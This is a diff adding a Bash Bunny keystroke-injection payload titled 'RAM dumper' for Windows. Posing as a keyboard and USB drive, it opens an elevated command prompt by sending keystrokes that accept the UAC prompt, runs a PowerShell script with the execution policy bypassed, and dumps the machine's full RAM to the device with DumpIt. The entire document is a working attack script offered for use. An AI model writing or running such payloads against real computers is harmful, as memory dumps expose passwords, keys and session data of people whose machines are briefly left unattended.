@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+# Title:            RAM dumper
+# Payload creator:  Kevin
+# Target:           Windows
+
+# 
+# Executes ramdump.ps1 which executes DumpIt.exe to dump RAM into external drive
+
+
+
+LED R B
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+
+LED R G VERYFAST
+
+QUACK GUI r
+QUACK DELAY 300
+QUACK STRING powershell Start-Process cmd -Verb runAs
+QUACK ENTER
+QUACK DELAY 2000
+QUACK ALT y
+QUACK DELAY 1000
+QUACK ALT j
+QUACK ENTER
+QUACK DELAY 1000
+
+
+QUACK STRING powershell -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\ramdump.ps1')"
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING y
+QUACK ENTER
+
+QUACK DELAY 70000
+QUACK STRING exit
+QUACK ENTER
+
+LED G
